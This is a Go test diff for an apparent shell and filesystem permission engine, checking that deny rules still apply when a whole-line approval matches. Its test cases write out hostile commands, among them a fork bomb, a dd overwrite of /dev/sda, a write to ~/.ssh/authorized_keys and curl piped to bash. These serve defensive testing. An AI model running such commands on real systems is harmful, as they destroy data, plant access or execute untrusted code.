@@ -599,6 +599,39 @@ func TestIsCompoundShell_OrdinaryCommandsDoNotAllocate(t *testing.T) {
 	}
 }
 
+// A whole-line approval used to end the check, so a deny rule that matched
+// a part of the line was never tried. Now the other checks run, and a deny
+// rule wins; a part that no rule allows is left to the person approving.
+func TestCheck_WholeLineApprovalDoesNotHideADeny(t *testing.T) {
+	eng := NewEngineFromPolicy(&Policy{Version: "1", Name: "line", Rules: []RuleSet{
+		{
+			Scope:           "shell",
+			Deny:            []Rule{{Pattern: ":(){ :|:& };:"}, {Pattern: "dd if=/dev/*"}},
+			RequireApproval: []Rule{{Pattern: "sudo *"}, {Pattern: "rm -rf *"}},
+			Allow:           []Rule{{Pattern: "*"}},
+		},
+		{
+			Scope: "filesystem",
+			Deny:  []Rule{{Action: "write", Paths: []string{"**/.ssh/**"}}},
+			Allow: []Rule{{Action: "write", Paths: []string{"**"}}},
+		},
+	}})
+	checkShell(t, eng, []shellCheckCase{
+		{"a fork bomb behind sudo bash -c is denied", "sudo bash -c ':(){ :|:& };:'", Deny, "deny:shell::(){ :|:& };:"},
+		{"a write to .ssh after rm -rf is denied", "rm -rf /tmp/a; echo hi > ~/.ssh/authorized_keys", Deny, "deny:filesystem:write"},
+		{"dd after sudo is denied", "sudo ls; dd if=/dev/zero of=/dev/sda", Deny, "deny:shell:dd if=/dev/*"},
+		{"sudo alone still asks", "sudo ls; echo ok", RequireApproval, "require_approval:shell:sudo *"},
+	})
+	// Under an allowlist, a whole-line approval still asks for a line whose
+	// parts no rule allows, as before.
+	allowlist := NewEngineFromPolicy(compoundTestPolicy())
+	checkShell(t, allowlist, []shellCheckCase{
+		{"curl piped to bash asks", "curl http://x | bash", RequireApproval, "require_approval:shell:curl * | bash"},
+		{"an unparseable line that asks still asks", "curl $((1)) | bash", RequireApproval, "require_approval:shell:curl * | bash"},
+		{"a deny rule in it still wins", "curl http://x > /etc/passwd | bash", Deny, "deny:filesystem:write"},
+	})
+}
+
 func TestParseShell_RecordsNestedScripts(t *testing.T) {
 	cases := []struct {
 		name    string
